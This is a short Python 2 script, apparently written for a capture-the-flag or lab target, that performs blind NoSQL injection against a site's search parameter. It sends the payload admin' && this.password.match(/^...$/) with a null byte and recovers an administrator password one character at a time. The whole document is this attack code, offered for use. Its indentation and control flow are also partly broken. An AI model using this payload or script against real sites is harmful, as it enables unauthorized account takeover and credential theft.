import requests,re
from bs4 import BeautifulSoup

#define variables
complete = False
key = ""
keyspace = "0123456789abcdef-"
wild = ".*"

def send_request(input,key):
	#build URL
	URL = base_url + "/?search=admin%27%20%26%26%20this.password.match(/^" + key + input + wild +"$/)%00"
        r = requests.get(URL)
        soup = BeautifulSoup(r.text, "lxml")
        tags = soup.find_all("a")
        for i in tags:
        	if "admin" in i:
			#Check completion of the password
			URL = base_url + "/?search=admin%27%20%26%26%20this.password.match(/^" + key + input +"$/)%00"
			full_check = requests.get(URL)
			soup = BeautifulSoup(full_check.text, "lxml")
			full_tags = soup.find_all("a")
			print "Found the following tags"
			for j in full_tags:
				if "admin" in j:
					print "Full Password Found"
					complete = True
				else:
					return True
		else:
			continue

def loopy(key):
	while not complete:
        	for i in keyspace:
                	if send_request(i,key):
				print "Last key found %s: " % (i)
				# Update key here
				key = key + i
				print "Current Full Key: %s" % key
				break
			else:
				continue


if __name__ == "__main__":
        base_url = raw_input("Base URL: ")
	loopy(key)
